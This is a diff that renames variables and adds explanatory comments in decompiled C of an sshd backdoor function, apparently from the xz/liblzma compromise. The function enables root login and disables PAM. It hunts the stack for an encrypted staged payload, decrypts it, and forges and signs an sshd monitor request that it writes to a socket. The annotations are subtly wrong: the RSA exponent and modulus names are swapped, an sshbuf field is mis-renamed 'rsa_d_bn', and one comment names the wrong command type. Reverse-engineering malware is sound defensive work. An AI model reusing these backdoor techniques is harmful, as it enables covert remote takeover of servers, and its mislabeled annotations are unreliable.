@@ -19,47 +19,47 @@
 BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
 
 {
-  u8 uVar1;
-  char cVar2;
-  u32 uVar3;
-  imported_funcs_t *piVar4;
-  libc_imports_t *plVar5;
-  sshd_ctx_t *psVar6;
-  long *plVar7;
-  undefined8 *puVar8;
-  pfn_EVP_Digest_t ppVar9;
-  BOOL BVar10;
+  u8 current_byte;
+  char expected_digest_byte;
+  uint cmd_type;
+  imported_funcs_t *imports;
+  libc_imports_t *libc_funcs;
+  sshd_ctx_t *sshd_ctx;
+  long *payload_header;
+  u64 *stack_limit;
+  pfn_EVP_Digest_t evp_digest;
+  BOOL success;
   uint uVar11;
-  int iVar12;
-  cmd_arguments_t *pcVar13;
-  long *plVar14;
-  ssize_t sVar15;
-  int *piVar16;
-  RSA *r;
-  BIGNUM *pBVar17;
-  BIGNUM *pBVar18;
-  BIGNUM *d;
-  EVP_MD *type;
-  long lVar19;
+  int status;
+  cmd_arguments_t *cmd_args;
+  long *payload_scan_end;
+  ssize_t io_result;
+  int *errno_slot;
+  RSA *rsa_ctx;
+  BIGNUM *rsa_e_bn;
+  BIGNUM *rsa_n_bn;
+  BIGNUM *rsa_d_bn;
+  EVP_MD *digest_type;
+  long loop_idx;
   byte extraout_DL;
-  size_t sVar20;
-  byte bVar21;
+  size_t payload_size;
+  byte monitor_flag_mask;
   uint socket_index;
-  undefined8 *puVar22;
-  u64 bufferSize;
+  u64 *stack_slot;
+  u64 payload_room;
   uint *puVar23;
   ulong *puVar24;
   sshbuf *psVar25;
-  uint *puVar26;
+  uint *request_words;
   undefined4 *puVar27;
   uchar *puVar28;
   uint *puVar29;
   size_t *psVar30;
   u8 *puVar31;
-  char *pcVar32;
-  ulong uVar33;
-  long *addr;
-  long lVar34;
+  char *rsa_alg_name;
+  ulong payload_remaining;
+  long *stack_candidate;
+  long digest_idx;
   byte bVar35;
   u8 monitor_request [1800];
   cmd_arguments_t *cmd_flags;
@@ -98,25 +98,25 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   monitor_req_header_words[1] = 0;
   monitor_req_header_words[2] = 0;
   monitor_req_header_words[3] = 0;
-  puVar26 = monitor_req_header_words + 4;
-  for (lVar19 = 0x236; lVar19 != 0; lVar19 = lVar19 + -1) {
-    *puVar26 = 0;
-    puVar26 = puVar26 + 1;
+  request_words = monitor_req_header_words + 4;
+  for (loop_idx = 0x236; loop_idx != 0; loop_idx = loop_idx + -1) {
+    *request_words = 0;
+    request_words = request_words + 1;
   }
   monitor_fd = -1;
   if (args == (monitor_data_t *)0x0) {
     return FALSE;
   }
-  pBVar17 = args->rsa_n;
-  if (pBVar17 == (BIGNUM *)0x0) {
+  rsa_e_bn = args->rsa_n;
+  if (rsa_e_bn == (BIGNUM *)0x0) {
     return FALSE;
   }
-  pBVar18 = args->rsa_e;
-  if (pBVar18 == (BIGNUM *)0x0) {
+  rsa_n_bn = args->rsa_e;
+  if (rsa_n_bn == (BIGNUM *)0x0) {
     return FALSE;
   }
-  uVar3 = args->cmd_type;
-  if ((uVar3 == 3) && ((args->args->monitor_flags & 0x40) == 0)) {
+  cmd_type = args->cmd_type;
+  if ((cmd_type == 3) && ((args->args->monitor_flags & 0x40) == 0)) {
     if (args->rsa == (RSA *)0x0) {
       return FALSE;
     }
@@ -130,102 +130,105 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   if (ctx == (global_context_t *)0x0) {
     return FALSE;
   }
-  piVar4 = ctx->imported_funcs;
-  if (piVar4 == (imported_funcs_t *)0x0) {
+  imports = ctx->imported_funcs;
+  if (imports == (imported_funcs_t *)0x0) {
     return FALSE;
   }
-  plVar5 = ctx->libc_imports;
-  if (plVar5 == (libc_imports_t *)0x0) {
+  libc_funcs = ctx->libc_imports;
+  if (libc_funcs == (libc_imports_t *)0x0) {
     return FALSE;
   }
-  if (plVar5->pselect == (pfn_pselect_t)0x0) {
+  if (libc_funcs->pselect == (pfn_pselect_t)0x0) {
     return FALSE;
   }
-  if (plVar5->__errno_location == (pfn___errno_location_t)0x0) {
+  if (libc_funcs->__errno_location == (pfn___errno_location_t)0x0) {
     return FALSE;
   }
-  psVar6 = ctx->sshd_ctx;
-  if (psVar6->have_mm_answer_keyallowed == FALSE) {
-    if (uVar3 == 0) {
+  sshd_ctx = ctx->sshd_ctx;
+  // AutoDoc: Before the mm hooks land, only the minimal control-plane commands are accepted; anything needing KEYALLOWED is rejected.
+  if (sshd_ctx->have_mm_answer_keyallowed == FALSE) {
+    if (cmd_type == 0) {
       return FALSE;
     }
-    pcVar13 = args->args;
-    if (uVar3 != 3) {
-      if (pcVar13 == (cmd_arguments_t *)0x0) {
-        if (uVar3 != 1) goto LAB_0010845f;
+    cmd_args = args->args;
+    if (cmd_type != 3) {
+      if (cmd_args == (cmd_arguments_t *)0x0) {
+        if (cmd_type != 1) goto LAB_0010845f;
       }
-      else if (uVar3 != 1) {
-        if (uVar3 == 2) goto LAB_0010845f;
+      else if (cmd_type != 1) {
+        if (cmd_type == 2) goto LAB_0010845f;
         goto LAB_00108447;
       }
       goto LAB_0010843f;
     }
-    if ((pcVar13->request_flags & 0x20) != 0) {
+    if ((cmd_args->request_flags & 0x20) != 0) {
       return FALSE;
     }
 LAB_0010844c:
-    uVar1 = pcVar13->field_0x3;
+    current_byte = cmd_args->field_0x3;
 LAB_00108450:
-    if ((char)uVar1 < '\0') goto LAB_0010845f;
+    if ((char)current_byte < '\0') goto LAB_0010845f;
   }
   else {
-    pcVar13 = args->args;
-    if (pcVar13 == (cmd_arguments_t *)0x0) {
-      if (uVar3 == 0) goto LAB_00108434;
-      if (uVar3 != 1) {
+    cmd_args = args->args;
+    if (cmd_args == (cmd_arguments_t *)0x0) {
+      if (cmd_type == 0) goto LAB_00108434;
+      if (cmd_type != 1) {
 LAB_00108447:
-        if (uVar3 != 3) goto LAB_0010845f;
+        if (cmd_type != 3) goto LAB_0010845f;
         goto LAB_0010844c;
       }
     }
-    else if (uVar3 != 1) {
-      if (uVar3 == 2) goto LAB_0010845f;
-      if (uVar3 != 0) goto LAB_00108447;
+    else if (cmd_type != 1) {
+      if (cmd_type == 2) goto LAB_0010845f;
+      if (cmd_type != 0) goto LAB_00108447;
 LAB_00108434:
-      uVar1 = pcVar13->monitor_flags;
+      current_byte = cmd_args->monitor_flags;
       goto LAB_00108450;
     }
 LAB_0010843f:
-    if ((pcVar13->monitor_flags & 1) != 0) goto LAB_0010845f;
+    if ((cmd_args->monitor_flags & 1) != 0) goto LAB_0010845f;
   }
-  *psVar6->permit_root_login_ptr = 3;
+  *sshd_ctx->permit_root_login_ptr = 3;
 LAB_0010845f:
   if ((args->cmd_type < 2) || (args->cmd_type == 3)) {
-    if ((pcVar13->control_flags & 0x40) != 0) {
-      if (psVar6->use_pam_ptr == (int *)0x0) {
+    if ((cmd_args->control_flags & 0x40) != 0) {
+      if (sshd_ctx->use_pam_ptr == (int *)0x0) {
         return FALSE;
       }
-      *psVar6->use_pam_ptr = 0;
+      *sshd_ctx->use_pam_ptr = 0;
     }
-    if ((args->cmd_type == 3) && (bVar21 = pcVar13->monitor_flags & 0xc0, bVar21 != 0xc0)) {
-      if (bVar21 == 0x40) {
-        if (plVar5->exit == (pfn_exit_t)0x0) {
+    // AutoDoc: PRIV/EXIT payloads hunt the stack for the staged ChaCha blob, verify its hash, and decrypt it in place before forging the monitor request.
+    if ((args->cmd_type == 3) && (monitor_flag_mask = cmd_args->monitor_flags & 0xc0, monitor_flag_mask != 0xc0)) {
+      if (monitor_flag_mask == 0x40) {
+        if (libc_funcs->exit == (pfn_exit_t)0x0) {
           return FALSE;
         }
-        (*plVar5->exit)(0);
+        // AutoDoc: Command type 2 asks libc's `exit()` to terminate sshd once the exchange is done.
+        (*libc_funcs->exit)(0);
         return FALSE;
       }
       if (args->payload_body_size < 0x30) {
         return FALSE;
       }
-      plVar7 = (long *)args->payload_body;
-      lVar19 = *plVar7;
-      sVar20 = plVar7[1];
-      if (0x3fef < sVar20 - 0x11) {
+      payload_header = (long *)args->payload_body;
+      loop_idx = *payload_header;
+      payload_size = payload_header[1];
+      if (0x3fef < payload_size - 0x11) {
         return FALSE;
       }
-      puVar8 = (undefined8 *)plVar5->__libc_stack_end;
-      puVar22 = (undefined8 *)register0x00000020;
+      stack_limit = (undefined8 *)libc_funcs->__libc_stack_end;
+      stack_slot = (undefined8 *)register0x00000020;
       do {
-        if (puVar8 <= puVar22) {
+        if (stack_limit <= stack_slot) {
           return FALSE;
         }
-        addr = (long *)*puVar22;
-        if ((long *)0xffffff < addr) {
-          BVar10 = is_range_mapped((u8 *)addr,0x4001 - sVar20,ctx);
-          if (BVar10 != FALSE) {
-            plVar14 = (long *)((0x4001 - sVar20) + (long)addr);
-            for (; addr < plVar14; addr = (long *)((long)addr + 1)) {
+        stack_candidate = (long *)*stack_slot;
+        if ((long *)0xffffff < stack_candidate) {
+          success = is_range_mapped((u8 *)stack_candidate,0x4001 - payload_size,ctx);
+          if (success != FALSE) {
+            payload_scan_end = (long *)((0x4001 - payload_size) + (long)stack_candidate);
+            for (; stack_candidate < payload_scan_end; stack_candidate = (long *)((long)stack_candidate + 1)) {
               netlen_tmp[0] = 0;
               netlen_tmp[1] = 0;
               netlen_tmp_pad = 0;
@@ -246,34 +249,34 @@ LAB_0010845f:
               payload_hash[0xd] = '\0';
               payload_hash[0xe] = '\0';
               payload_hash[0xf] = '\0';
-              if ((*addr == lVar19) &&
-                 (BVar10 = sha256(addr,sVar20,(u8 *)netlen_tmp,0x20,ctx->imported_funcs),
-                 BVar10 != FALSE)) {
-                lVar34 = 0;
+              if ((*stack_candidate == loop_idx) &&
+                 (success = sha256(stack_candidate,payload_size,(u8 *)netlen_tmp,0x20,ctx->imported_funcs),
+                 success != FALSE)) {
+                digest_idx = 0;
                 while( TRUE ) {
-                  cVar2 = *(char *)((long)plVar7 + lVar34 + 0x10);
-                  uVar1 = *(u8 *)((long)netlen_tmp + lVar34);
-                  if ((cVar2 < (char)uVar1) || ((char)uVar1 < cVar2)) break;
-                  lVar34 = lVar34 + 1;
-                  if (lVar34 == 0x20) {
+                  expected_digest_byte = *(char *)((long)payload_header + digest_idx + 0x10);
+                  current_byte = *(u8 *)((long)netlen_tmp + digest_idx);
+                  if ((expected_digest_byte < (char)current_byte) || ((char)current_byte < expected_digest_byte)) break;
+                  digest_idx = digest_idx + 1;
+                  if (digest_idx == 0x20) {
                     netlen_tmp[0] = 0;
                     netlen_tmp[1] = 0;
                     netlen_tmp_pad = 0;
                     netlen_tmp_pad_hi = 0;
                     puVar28 = payload_hash;
-                    for (lVar19 = 0x29; lVar19 != 0; lVar19 = lVar19 + -1) {
+                    for (loop_idx = 0x29; loop_idx != 0; loop_idx = loop_idx + -1) {
                       *puVar28 = '\0';
                       puVar28 = puVar28 + (ulong)bVar35 * -2 + 1;
                     }
-                    BVar10 = secret_data_get_decrypted((u8 *)netlen_tmp,ctx);
-                    if (BVar10 == FALSE) {
+                    success = secret_data_get_decrypted((u8 *)netlen_tmp,ctx);
+                    if (success == FALSE) {
                       return FALSE;
                     }
-                    sVar20 = sVar20 - 0x10;
-                    puVar26 = (uint *)(addr + 2);
-                    BVar10 = chacha_decrypt((u8 *)puVar26,(int)sVar20,(u8 *)netlen_tmp,(u8 *)addr,
-                                            (u8 *)puVar26,ctx->imported_funcs);
-                    if (BVar10 == FALSE) {
+                    payload_size = payload_size - 0x10;
+                    request_words = (uint *)(stack_candidate + 2);
+                    success = chacha_decrypt((u8 *)request_words,(int)payload_size,(u8 *)netlen_tmp,(u8 *)stack_candidate,
+                                            (u8 *)request_words,ctx->imported_funcs);
+                    if (success == FALSE) {
                       return FALSE;
                     }
                     goto LAB_00108861;
@@ -283,27 +286,27 @@ LAB_0010845f:
             }
           }
         }
-        puVar22 = puVar22 + 1;
+        stack_slot = stack_slot + 1;
       } while( TRUE );
     }
   }
-  pcVar32 = ctx->ssh_rsa_cert_alg;
+  rsa_alg_name = ctx->ssh_rsa_cert_alg;
   rsa_signature_block[0] = 0;
   rsa_signature_block[1] = 0;
-  puVar26 = netlen_tmp;
-  for (lVar19 = 0x69; lVar19 != 0; lVar19 = lVar19 + -1) {
-    *puVar26 = 0;
-    puVar26 = puVar26 + 1;
+  request_words = netlen_tmp;
+  for (loop_idx = 0x69; loop_idx != 0; loop_idx = loop_idx + -1) {
+    *request_words = 0;
+    request_words = request_words + 1;
   }
   rsa_exponent_byte = '\x01';
   psVar25 = sshbuf_vec;
-  for (lVar19 = 0x47; lVar19 != 0; lVar19 = lVar19 + -1) {
-    *(undefined4 *)&psVar25->d = 0;
-    psVar25 = (sshbuf *)((long)&psVar25->d + 4);
+  for (loop_idx = 0x47; loop_idx != 0; loop_idx = loop_idx + -1) {
+    *(undefined4 *)&psVar25->rsa_d_bn = 0;
+    psVar25 = (sshbuf *)((long)&psVar25->rsa_d_bn + 4);
   }
   rsa_signature_len = 0;
   puVar27 = rsa_modulus_words;
-  for (lVar19 = 0x3c; lVar19 != 0; lVar19 = lVar19 + -1) {
+  for (loop_idx = 0x3c; loop_idx != 0; loop_idx = loop_idx + -1) {
     *puVar27 = 0;
     puVar27 = puVar27 + 1;
   }
@@ -324,7 +327,7 @@ LAB_0010845f:
   rsa_message_digest[0xe] = '\0';
   rsa_message_digest[0xf] = '\0';
   puVar27 = sshbuf_tmp_words;
-  for (lVar19 = 0x3c; lVar19 != 0; lVar19 = lVar19 + -1) {
+  for (loop_idx = 0x3c; loop_idx != 0; loop_idx = loop_idx + -1) {
     *puVar27 = 0;
     puVar27 = puVar27 + 1;
   }
@@ -346,15 +349,15 @@ LAB_0010845f:
   rsa_message_digest[0x1f] = '\0';
   rsa_modulus_qword0 = 0;
   rsa_modulus_qword1 = 0;
-  if (((pcVar32 != (char *)0x0) && (ctx->rsa_sha2_256_alg != (char *)0x0)) &&
-     (BVar10 = contains_null_pointers(&piVar4->RSA_new,9), BVar10 == FALSE)) {
-    puVar26 = monitor_req_header_words;
-    lVar34 = 0;
-    uVar33 = 0;
+  if (((rsa_alg_name != (char *)0x0) && (ctx->rsa_sha2_256_alg != (char *)0x0)) &&
+     (success = contains_null_pointers(&imports->RSA_new,9), success == FALSE)) {
+    request_words = monitor_req_header_words;
+    digest_idx = 0;
+    payload_remaining = 0;
     netlen_tmp[1] = (uint)extraout_DL;
     netlen_tmp_pad = 2;
-    puVar23 = puVar26;
-    for (lVar19 = 0x23a; lVar19 != 0; lVar19 = lVar19 + -1) {
+    puVar23 = request_words;
+    for (loop_idx = 0x23a; loop_idx != 0; loop_idx = loop_idx + -1) {
       *puVar23 = 0;
       puVar23 = puVar23 + (ulong)bVar35 * -2 + 1;
     }
@@ -362,254 +365,260 @@ LAB_0010845f:
     payload_hash[6] = '\0';
     payload_hash[7] = '\0';
     payload_hash[8] = '\x1c';
-    rsa_components[0] = pBVar18;
+    rsa_components[0] = rsa_n_bn;
     rsa_modulus_qword0 = CONCAT71((rsa_modulus_qword0 >> 8),0x80);
-    rsa_components[1] = pBVar17;
-    *(u64 *)(payload_hash + 9) = (undefined7)*(undefined8 *)pcVar32;
-    payload_hash[0x10] = (uchar)((ulong)*(undefined8 *)pcVar32 >> 0x38);
-    *(uint *)(payload_hash + 0x11) = (undefined4)*(undefined8 *)(pcVar32 + 8);
+    rsa_components[1] = rsa_e_bn;
+    *(u64 *)(payload_hash + 9) = (undefined7)*(undefined8 *)rsa_alg_name;
+    payload_hash[0x10] = (uchar)((ulong)*(undefined8 *)rsa_alg_name >> 0x38);
+    *(uint *)(payload_hash + 0x11) = (undefined4)*(undefined8 *)(rsa_alg_name + 8);
     rsa_modulus_shift = 8;
     rsa_modulus_flag = 1;
-    *(uint *)(payload_hash + 0x15) = (undefined4)*(undefined8 *)(pcVar32 + 0xc);
-    *(uint *)(payload_hash + 0x19) = (undefined4)((ulong)*(undefined8 *)(pcVar32 + 0xc) >> 0x20);
-    stack0xfffffffffffff50d = *(undefined8 *)(pcVar32 + 0x14);
-    puVar22 = &rsa_modulus_qword0;
+    *(uint *)(payload_hash + 0x15) = (undefined4)*(undefined8 *)(rsa_alg_name + 0xc);
+    *(uint *)(payload_hash + 0x19) = (undefined4)((ulong)*(undefined8 *)(rsa_alg_name + 0xc) >> 0x20);
+    stack0xfffffffffffff50d = *(undefined8 *)(rsa_alg_name + 0x14);
+    stack_slot = &rsa_modulus_qword0;
     puVar27 = rsa_template_words;
-    for (lVar19 = 0x40; lVar19 != 0; lVar19 = lVar19 + -1) {
-      *puVar27 = *(undefined4 *)puVar22;
-      puVar22 = (undefined8 *)((long)puVar22 + (ulong)bVar35 * -8 + 4);
+    for (loop_idx = 0x40; loop_idx != 0; loop_idx = loop_idx + -1) {
+      *puVar27 = *(undefined4 *)stack_slot;
+      stack_slot = (undefined8 *)((long)stack_slot + (ulong)bVar35 * -8 + 4);
       puVar27 = puVar27 + (ulong)bVar35 * -2 + 1;
     }
-    bufferSize = 0x628;
+    payload_room = 0x628;
     monitor_req_len_prefix = 0x1000000;
     monitor_req_payload_len = 0x7000000;
-    monitor_req_prefix_bytes = (undefined3)*(undefined4 *)pcVar32;
-    monitor_req_prefix_pad = (undefined1)*(undefined4 *)(pcVar32 + 3);
-    monitor_req_prefix_pad_hi = (undefined3)((uint)*(undefined4 *)(pcVar32 + 3) >> 8);
+    monitor_req_prefix_bytes = (undefined3)*(undefined4 *)rsa_alg_name;
+    monitor_req_prefix_pad = (undefined1)*(undefined4 *)(rsa_alg_name + 3);
+    monitor_req_prefix_pad_hi = (undefined3)((uint)*(undefined4 *)(rsa_alg_name + 3) >> 8);
     while( TRUE ) {
       serialized_chunk_len = 0;
-      BVar10 = bignum_serialize(monitor_req_payload + uVar33,bufferSize,&serialized_chunk_len,rsa_components[lVar34],piVar4);
-      if ((BVar10 == FALSE) || (bufferSize < serialized_chunk_len)) break;
-      uVar33 = uVar33 + serialized_chunk_len;
-      bufferSize = bufferSize - serialized_chunk_len;
-      if (lVar34 != 0) {
-        if (0x628 < uVar33) {
+      // AutoDoc: Serialise the attacker's exponent and modulus into the monitor frame so sshd sees a well-formed RSA keypair.
+      success = bignum_serialize(monitor_req_payload + payload_remaining,payload_room,&serialized_chunk_len,rsa_components[digest_idx],imports);
+      if ((success == FALSE) || (payload_room < serialized_chunk_len)) break;
+      payload_remaining = payload_remaining + serialized_chunk_len;
+      payload_room = payload_room - serialized_chunk_len;
+      if (digest_idx != 0) {
+        if (0x628 < payload_remaining) {
           return FALSE;
         }
-        iVar12 = (int)uVar33;
-        uVar11 = iVar12 + 0xb;
+        status = (int)payload_remaining;
+        uVar11 = status + 0xb;
         monitor_req_digest_len = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                     uVar11 * 0x1000000;
-        uVar11 = iVar12 + 0x2a7;
+        uVar11 = status + 0x2a7;
         *(uint *)(payload_hash + 1) =
              uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 * 0x1000000
         ;
-        uVar11 = iVar12 + 700;
+        uVar11 = status + 700;
         netlen_tmp[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                        uVar11 * 0x1000000;
-        piVar4 = ctx->imported_funcs;
+        imports = ctx->imported_funcs;
         puVar23 = netlen_tmp;
-        puVar29 = puVar26;
-        for (lVar19 = 0x69; lVar19 != 0; lVar19 = lVar19 + -1) {
+        puVar29 = request_words;
+        for (loop_idx = 0x69; loop_idx != 0; loop_idx = loop_idx + -1) {
           *puVar29 = *puVar23;
           puVar23 = puVar23 + (ulong)bVar35 * -2 + 1;
           puVar29 = puVar29 + (ulong)bVar35 * -2 + 1;
         }
-        r = (*piVar4->RSA_new)();
-        if (r == (RSA *)0x0) {
+        rsa_ctx = (*imports->RSA_new)();
+        if (rsa_ctx == (RSA *)0x0) {
           return FALSE;
         }
-        pBVar17 = (*ctx->imported_funcs->BN_bin2bn)(&rsa_exponent_byte,1,(BIGNUM *)0x0);
-        if (pBVar17 != (BIGNUM *)0x0) {
-          pBVar18 = (*ctx->imported_funcs->BN_bin2bn)((uchar *)&rsa_modulus_qword0,0x100,(BIGNUM *)0x0);
-          d = (*ctx->imported_funcs->BN_bin2bn)(&rsa_exponent_byte,1,(BIGNUM *)0x0);
-          iVar12 = (*ctx->imported_funcs->RSA_set0_key)(r,pBVar18,pBVar17,d);
-          if (iVar12 != 1) goto LAB_00108cd2;
-          ppVar9 = ctx->imported_funcs->EVP_Digest;
-          type = (*ctx->imported_funcs->EVP_sha256)();
-          iVar12 = (*ppVar9)(monitor_req_frame,uVar33 + 399,rsa_message_digest,(uint *)0x0,type,(ENGINE *)0x0);
-          if (iVar12 == 1) {
-            iVar12 = (*ctx->imported_funcs->RSA_sign)
-                               (0x2a0,rsa_message_digest,0x20,(uchar *)rsa_signature_block,&rsa_signature_len,r);
-            if ((iVar12 == 1) && (rsa_signature_len == 0x100)) {
-              sshbuf_vec[0].d = (u8 *)0xc00000014010000;
+        rsa_e_bn = (*ctx->imported_funcs->BN_bin2bn)(&rsa_exponent_byte,1,(BIGNUM *)0x0);
+        if (rsa_e_bn != (BIGNUM *)0x0) {
+          rsa_n_bn = (*ctx->imported_funcs->BN_bin2bn)((uchar *)&rsa_modulus_qword0,0x100,(BIGNUM *)0x0);
+          rsa_d_bn = (*ctx->imported_funcs->BN_bin2bn)(&rsa_exponent_byte,1,(BIGNUM *)0x0);
+          // AutoDoc: Build a temporary RSA object from the supplied components in order to hash and sign the forged packet.
+          status = (*ctx->imported_funcs->RSA_set0_key)(rsa_ctx,rsa_n_bn,rsa_e_bn,rsa_d_bn);
+          if (status != 1) goto LAB_00108cd2;
+          evp_digest = ctx->imported_funcs->EVP_Digest;
+          digest_type = (*ctx->imported_funcs->EVP_sha256)();
+          status = (*evp_digest)(monitor_req_frame,payload_remaining + 399,rsa_message_digest,(uint *)0x0,digest_type,(ENGINE *)0x0);
+          if (status == 1) {
+            status = (*ctx->imported_funcs->RSA_sign)
+                               (0x2a0,rsa_message_digest,0x20,(uchar *)rsa_signature_block,&rsa_signature_len,rsa_ctx);
+            if ((status == 1) && (rsa_signature_len == 0x100)) {
+              sshbuf_vec[0].rsa_d_bn = (u8 *)0xc00000014010000;
               *(uint *)((u8 *)&sshbuf_vec[0].off + 4) = 0x10000;
               sshbuf_vec[0].cd = *(u8 **)ctx->rsa_sha2_256_alg;
               *(uint *)&sshbuf_vec[0].off = *(undefined4 *)(ctx->rsa_sha2_256_alg + 8);
-              sVar20 = uVar33 + 0x2c0;
+              payload_size = payload_remaining + 0x2c0;
               puVar24 = rsa_signature_block;
               psVar30 = &sshbuf_vec[0].size;
-              for (lVar19 = 0x40; lVar19 != 0; lVar19 = lVar19 + -1) {
+              for (loop_idx = 0x40; loop_idx != 0; loop_idx = loop_idx + -1) {
                 *(int *)psVar30 = (int)*puVar24;
                 puVar24 = (ulong *)((long)puVar24 + (ulong)bVar35 * -8 + 4);
                 psVar30 = (size_t *)((long)psVar30 + (ulong)bVar35 * -8 + 4);
               }
-              piVar4 = ctx->imported_funcs;
+              imports = ctx->imported_funcs;
               psVar25 = sshbuf_vec;
-              puVar31 = monitor_req_payload + uVar33;
-              for (lVar19 = 0x47; lVar19 != 0; lVar19 = lVar19 + -1) {
-                *(undefined4 *)puVar31 = *(undefined4 *)&psVar25->d;
+              puVar31 = monitor_req_payload + payload_remaining;
+              for (loop_idx = 0x47; loop_idx != 0; loop_idx = loop_idx + -1) {
+                *(undefined4 *)puVar31 = *(undefined4 *)&psVar25->rsa_d_bn;
                 psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
                 puVar31 = puVar31 + ((ulong)bVar35 * -2 + 1) * 4;
               }
-              (*piVar4->RSA_free)(r);
+              (*imports->RSA_free)(rsa_ctx);
 LAB_00108861:
-              pcVar13 = args->args;
+              cmd_args = args->args;
               uVar11 = args->cmd_type;
-              if (pcVar13 == (cmd_arguments_t *)0x0) {
+              if (cmd_args == (cmd_arguments_t *)0x0) {
                 return FALSE;
               }
-              if ((pcVar13->control_flags & 0x20) == 0) {
-                BVar10 = sshd_get_client_socket(ctx,&monitor_fd,1,DIR_WRITE);
+              // AutoDoc: Without an explicit socket override, call `sshd_get_client_socket`; otherwise honour the encoded socket selector bits.
+              if ((cmd_args->control_flags & 0x20) == 0) {
+                success = sshd_get_client_socket(ctx,&monitor_fd,1,DIR_WRITE);
               }
               else {
                 if (uVar11 == 2) {
-                  bVar21 = pcVar13->monitor_flags >> 1;
+                  monitor_flag_mask = cmd_args->monitor_flags >> 1;
 LAB_001088b7:
-                  socket_index = (uint)bVar21;
+                  socket_index = (uint)monitor_flag_mask;
                 }
                 else if (uVar11 < 3) {
                   if (uVar11 != 0) {
-                    bVar21 = pcVar13->monitor_flags >> 2;
+                    monitor_flag_mask = cmd_args->monitor_flags >> 2;
                     goto LAB_001088b7;
                   }
-                  socket_index = pcVar13->monitor_flags >> 3 & 0xf;
+                  socket_index = cmd_args->monitor_flags >> 3 & 0xf;
                 }
                 else {
                   socket_index = 1;
                   if (uVar11 == 3) {
-                    socket_index = pcVar13->request_flags & 0x1f;
+                    socket_index = cmd_args->request_flags & 0x1f;
                   }
                 }
-                BVar10 = sshd_get_usable_socket(&monitor_fd,socket_index,ctx->libc_imports);
+                success = sshd_get_usable_socket(&monitor_fd,socket_index,ctx->libc_imports);
               }
-              iVar12 = monitor_fd;
-              if (BVar10 == FALSE) {
+              status = monitor_fd;
+              if (success == FALSE) {
                 return FALSE;
               }
-              pcVar13 = args->args;
-              uVar3 = args->cmd_type;
-              plVar5 = ctx->libc_imports;
+              cmd_args = args->args;
+              cmd_type = args->cmd_type;
+              libc_funcs = ctx->libc_imports;
               psVar25 = sshbuf_vec;
-              for (lVar19 = 0x12; lVar19 != 0; lVar19 = lVar19 + -1) {
-                *(undefined4 *)&psVar25->d = 0;
+              for (loop_idx = 0x12; loop_idx != 0; loop_idx = loop_idx + -1) {
+                *(undefined4 *)&psVar25->rsa_d_bn = 0;
                 psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
               }
               if (monitor_fd < 0) {
                 return FALSE;
               }
-              if (pcVar13 == (cmd_arguments_t *)0x0) {
+              if (cmd_args == (cmd_arguments_t *)0x0) {
                 return FALSE;
               }
-              if (plVar5 == (libc_imports_t *)0x0) {
+              if (libc_funcs == (libc_imports_t *)0x0) {
                 return FALSE;
               }
-              if (plVar5->exit == (pfn_exit_t)0x0) {
+              if (libc_funcs->exit == (pfn_exit_t)0x0) {
                 return FALSE;
               }
-              if ((uVar3 == 0) || ((uVar3 == 3 && ((pcVar13->request_flags & 0x20) != 0)))) {
-                BVar10 = sshd_get_sshbuf(sshbuf_vec,ctx);
-                if (BVar10 == FALSE) {
+              // AutoDoc: COMMAND payloads (and explicit KEYALLOWED continuations) borrow an sshbuf so extra ciphertext can follow the forged frame.
+              if ((cmd_type == 0) || ((cmd_type == 3 && ((cmd_args->request_flags & 0x20) != 0)))) {
+                success = sshd_get_sshbuf(sshbuf_vec,ctx);
+                if (success == FALSE) {
                   return FALSE;
                 }
-                ctx->exit_flag = pcVar13->control_flags & 1;
+                ctx->exit_flag = cmd_args->control_flags & 1;
               }
-              sVar15 = fd_write(iVar12,puVar26,sVar20,plVar5);
-              if (sVar15 < 0) {
+              // AutoDoc: Push the forged monitor frame across the target fd; any short write aborts the run.
+              io_result = fd_write(status,request_words,payload_size,libc_funcs);
+              if (io_result < 0) {
                 return FALSE;
               }
-              if (uVar3 == 0) {
+              if (cmd_type == 0) {
 LAB_001089b5:
                 netlen_tmp[1] = netlen_tmp[1] & 0xffffff00;
-                sVar20 = sshbuf_vec[0].size;
+                payload_size = sshbuf_vec[0].size;
                 if (0x40 < sshbuf_vec[0].size) {
-                  sVar20 = 0x40;
+                  payload_size = 0x40;
                 }
-                uVar11 = (int)sVar20 + 1;
+                uVar11 = (int)payload_size + 1;
                 netlen_tmp[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                                uVar11 * 0x1000000;
-                sVar15 = fd_write(iVar12,netlen_tmp,5,plVar5);
-                if (sVar15 < 0) {
+                io_result = fd_write(status,netlen_tmp,5,libc_funcs);
+                if (io_result < 0) {
                   return FALSE;
                 }
-                sVar15 = fd_write(iVar12,sshbuf_vec[0].d,sVar20,plVar5);
-                if (sVar15 < 0) {
+                io_result = fd_write(status,sshbuf_vec[0].rsa_d_bn,payload_size,libc_funcs);
+                if (io_result < 0) {
                   return FALSE;
                 }
-                if (uVar3 != 3) goto LAB_0010897e;
+                if (cmd_type != 3) goto LAB_0010897e;
               }
               else {
-                if (uVar3 != 3) goto LAB_0010897e;
-                if ((pcVar13->request_flags & 0x20) != 0) goto LAB_001089b5;
+                if (cmd_type != 3) goto LAB_0010897e;
+                if ((cmd_args->request_flags & 0x20) != 0) goto LAB_001089b5;
               }
-              if (-1 < (char)pcVar13->control_flags) {
+              if (-1 < (char)cmd_args->control_flags) {
                 return TRUE;
               }
 LAB_0010897e:
+              // AutoDoc: When the wait bit is set, read the reply length and drain the monitor socket until sshd finishes responding.
               rsa_signature_block[0] = rsa_signature_block[0] & 0xffffffff00000000;
-              sVar15 = fd_read(iVar12,rsa_signature_block,4,plVar5);
-              if (sVar15 < 0) {
+              io_result = fd_read(status,rsa_signature_block,4,libc_funcs);
+              if (io_result < 0) {
                 return FALSE;
               }
               uVar11 = (uint)rsa_signature_block[0] >> 0x18 | ((uint)rsa_signature_block[0] & 0xff0000) >> 8 |
